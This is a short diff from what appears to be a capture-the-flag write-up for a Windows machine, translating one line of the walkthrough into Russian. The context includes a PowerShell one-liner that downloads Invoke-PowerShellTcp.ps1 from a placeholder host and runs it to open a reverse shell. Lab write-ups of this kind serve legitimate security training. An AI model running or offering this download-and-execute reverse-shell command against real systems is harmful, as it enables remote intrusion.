@@ -66,7 +66,7 @@ Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
 
 <img src="https://imgur.com/0S5GrCG.png"/>
 
-And you can see what ever command we input there it will show the output so now what we can do is to host a powershell reverse shell script ,download it using powershell and execute the function in the script to get a shell
+И Вы можете видеть, какую бы команду мы там ни вводили, она покажет результат, так что теперь все, что мы можем сделать, это разместить сценарий обратной оболочки powershell, загрузить его с помощью powershell и выполнить функцию в сценарии, чтобы получить оболочку:
 
 ```
 powershell iex (New-Object Net.WebClient).DownloadString('http://your-ip:your-port/Invoke-PowerShellTcp.ps1');Invoke-PowerShellTcp -Reverse -IPAddress your-ip -Port your-port
